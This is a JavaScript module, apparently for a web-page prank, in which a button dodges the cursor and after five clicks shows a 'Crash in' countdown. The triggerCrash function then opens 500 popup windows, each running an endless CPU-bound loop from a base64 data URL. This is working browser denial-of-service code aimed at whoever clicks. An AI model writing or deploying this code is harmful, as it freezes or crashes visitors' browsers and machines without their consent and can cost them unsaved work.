export class CrashSim {
  static clickCount = 0;
  static currentPositionIndex = 0;

  static init() {
    const button = document.getElementById('prank-btn');
    if (!button) return;

    button.addEventListener('click', () => {
      this.clickCount++;
      this.moveButton(button);

      if (this.clickCount >= 5) {
        this.showCountdown(() => {
          this.triggerCrash();
        });
      }
    });
  }

  static moveButton(button) {
    const positions = [   
      { top: '22px', left: 'auto', bottom: 'auto', right: '10px' },    
      { top: 'auto', left: 'auto', bottom: '15px', right: '15px' },   
      { top: 'auto', left: '15px', bottom: '15px', right: 'auto' },   
      { top: '52px', left: 'auto', bottom: 'auto', right: 'auto' }
    ];

    const pos = positions[this.currentPositionIndex];
    
    button.style.top = pos.top;
    button.style.right = pos.right;
    button.style.bottom = pos.bottom;
    button.style.left = pos.left;
    
    this.currentPositionIndex = (this.currentPositionIndex + 1) % positions.length;
    
    console.log('Moving button to position:', this.currentPositionIndex, pos);
  }


  static showCountdown(callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.8);
      color: white;
      font-size: 3rem;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    `;
    document.body.appendChild(overlay);

    let seconds = 5;
    overlay.textContent = `Crash in ${seconds}...`;

    const interval = setInterval(() => {
      seconds--;
      if (seconds > 0) {
        overlay.textContent = `Crash in ${seconds}...`;
      } else {
        clearInterval(interval);
        overlay.remove();
        callback();
      }
    }, 1000);
  }

  // Simulate a crash by opening many tabs with a busy script
  static triggerCrash() {
    const busyScript = `
      <html><body style="margin:0;overflow:hidden;background:black;color:white;">
      <h1 style="text-align:center;">Crash Tab</h1>
      <script>
        function busyLoop() {
          let i = 0;
          while(true) {
            i++;
            if(i > 1e9) i = 0; // Schleife mit hoher CPU-Last
          }
        }
        busyLoop();
      </script>
      </body></html>`;

    const url = 'data:text/html;base64,' + btoa(busyScript);

    for (let i = 0; i < 500; i++) {
      window.open(url, '_blank', 'width=300,height=200');
    }
  }
}